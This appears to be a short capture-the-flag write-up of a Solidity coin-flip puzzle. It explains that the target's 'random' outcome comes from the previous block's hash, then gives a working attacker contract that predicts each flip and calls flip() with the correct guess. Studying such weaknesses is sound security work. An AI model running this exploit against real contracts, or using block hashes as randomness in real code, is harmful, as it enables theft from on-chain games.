### Analysis
The critical error here is generating the coin flip result based on the last block number:
~~~
uint256 blockValue = uint256(blockhash(block.number.sub(1))); // NOT random!

...

uint256 coinFlip = blockValue.div(FACTOR);
bool side = coinFlip == 1 ? true : false;
~~~
Blockhashis a global variable that takes blocknumber and returns hash of the given block when blocknumber is one of the 256 most recent blocks; otherwise returns zero.
block.number.sub(1) returns the block number of the last block. Why the last one, not the current one? Because at the time the function is called, the current block is not yet mined.

### The Exploit
I have to call flip() in separate blocks after deployed because of this lastHash check in the contract:

~~~
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface ICoinFlip{
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipWrapper{
    uint256 public consecutiveWins=0;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function coinGuess(address _coinFlipAddr) external returns (uint256){
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        bool isRight = ICoinFlip(_coinFlipAddr).flip(side);
        if(isRight){
            consecutiveWins++;
        }else{
            consecutiveWins = 0;
        }
        return consecutiveWins;
    }
}
~~~